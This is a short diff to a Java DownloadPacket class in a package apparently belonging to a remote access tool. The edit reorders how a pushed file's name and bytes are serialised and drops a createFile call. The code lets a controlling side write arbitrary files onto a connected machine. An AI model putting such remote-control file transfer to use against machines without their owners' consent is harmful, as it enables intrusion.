@@ -7,8 +7,10 @@ import de.sogomn.rat.ActiveClient;
 
 public final class DownloadPacket extends AbstractPingPongPacket {
 	
-	private String path, fileName;
+	private String path;
+	
 	private byte[] data;
+	private String fileName;
 	
 	public DownloadPacket(final String path) {
 		this.path = path;
@@ -30,8 +32,8 @@ public final class DownloadPacket extends AbstractPingPongPacket {
 	@Override
 	protected void sendData(final ActiveClient client) {
 		client.writeInt(data.length);
-		client.writeUTF(fileName);
 		client.write(data);
+		client.writeUTF(fileName);
 	}
 	
 	@Override
@@ -44,9 +46,11 @@ public final class DownloadPacket extends AbstractPingPongPacket {
 		final int length = client.readInt();
 		
 		data = new byte[length];
-		fileName = client.readUTF();
 		
 		client.read(data);
+		
+		fileName = client.readUTF();
+		
 	}
 	
 	@Override
@@ -64,7 +68,6 @@ public final class DownloadPacket extends AbstractPingPongPacket {
 	
 	@Override
 	protected void executeData(final ActiveClient client) {
-		FileUtils.createFile(fileName);
 		FileUtils.writeData(fileName, data);
 	}
 	
